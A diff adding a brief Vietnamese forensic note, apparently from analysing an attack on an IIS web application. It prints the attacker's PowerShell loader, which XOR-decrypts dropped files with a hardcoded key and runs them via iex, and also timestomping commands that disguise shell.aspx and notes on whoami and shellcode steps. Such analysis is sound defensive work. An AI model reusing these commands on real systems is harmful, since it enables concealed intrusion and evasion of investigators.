@@ -1,0 +1,36 @@
+C:\Windows\Temp\x1fvogijp5pyzn7\tbyjzt4vw6y  (upload bằng file 9,10,11,12,13,14)
+C:\Windows\Temp\x1fvogijp5pyzn7\3186q1r3kpvk (upload bằng file 16)
+C:\Windows\Temp\x1fvogijp5pyzn7\9nu8w1q.notepad.exe (Chú ý file số 18)
+
+C:\Windows\Temp\infinity_edge -- (file 17) có một file powershell decrypt
+	$ProgressPreference = "SilentlyContinue";
+	$path_in_module="C:\Windows\Temp\x1fvogijp5pyzn7\tbyjzt4vw6y";2
+	$path_in_app_code="C:\Windows\Temp\x1fvogijp5pyzn7\3186q1r3kpvk";
+	$key=[System.Text.Encoding]::UTF8.GetBytes('4d65bdbad183f00203b1e80cf96fba549663dabeab12fab153a921b346975cdd');
+	$enc_module=[System.IO.File]::ReadAllBytes($path_in_module);
+	$enc_app_code=[System.IO.File]::ReadAllBytes($path_in_app_code);
+	$dec_module=New-Object Byte[] $enc_module.Length;
+	$dec_app_code=New-Object Byte[] $enc_app_code.Length;
+	for ($i = 0; $i -lt $enc_module.Length; $i++) {
+		$dec_module[$i] = $enc_module[$i] -bxor $key[$i % $key.Length];
+	};
+	for ($i = 0; $i -lt $enc_app_code.Length; $i++) {
+		$dec_app_code[$i] = $enc_app_code[$i] -bxor $key[$i % $key.Length];
+	};
+	$dec_module=[System.Text.Encoding]::UTF8.GetString($dec_module);
+	$dec_app_code=[System.Text.Encoding]::UTF8.GetString($dec_app_code);
+	$($dec_module+$dec_app_code)|iex;
+	Remove-Item -Path $path_in_app_code -Force 2>&1 | Out-Null;"
+	
+file 19: đọc file C:\Windows\Temp\x1fvogijp5pyzn7\9nu8w1q và sau đó xóa :D ? 
+file 20: thục hiện whoami và ghi vào C:\Windows\Temp\x1fvogijp5pyzn7\z73b9 có lỗi thì C:\Windows\Temp\x1fvogijp5pyzn7\6p1q9tforulxt0
+file 21
+C:\Windows\Temp\x1fvogijp5pyzn7\fnq6sghi4kqpu
+C:\Windows\Temp\x1fvogijp5pyzn7\6s1gcx6zzl         được tạo khi ở  C:\Windows\Temp\infinity_edge
+
+
+file 22: Inject shellcode tạo một file shellcode nhưng không load gì cả ? 
+file 23: từ infinity_edge chuyển sang dir C:\inetpub\wwwroot\webapp
+file 26: $ProgressPreference = "SilentlyContinue";$(Get-Item C:\inetpub\wwwroot\webapp\shell.aspx).CreationTime = Get-Date ((Get-Item C:\inetpub\wwwroot\webapp\upload.aspx ).CreationTime)
+file 27: $ProgressPreference = "SilentlyContinue";$(Get-Item C:\inetpub\wwwroot\webapp\shell.aspx).lastaccesstime = Get-Date ((Get-Item C:\inetpub\wwwroot\webapp\upload.aspx ).lastaccesstime)
+file 28: $ProgressPreference = "SilentlyContinue";$(Get-Item C:\inetpub\wwwroot\webapp\shell.aspx).lastwritetime = Get-Date ((Get-Item C:\inetpub\wwwroot\webapp\upload.aspx ).lastwritetime)
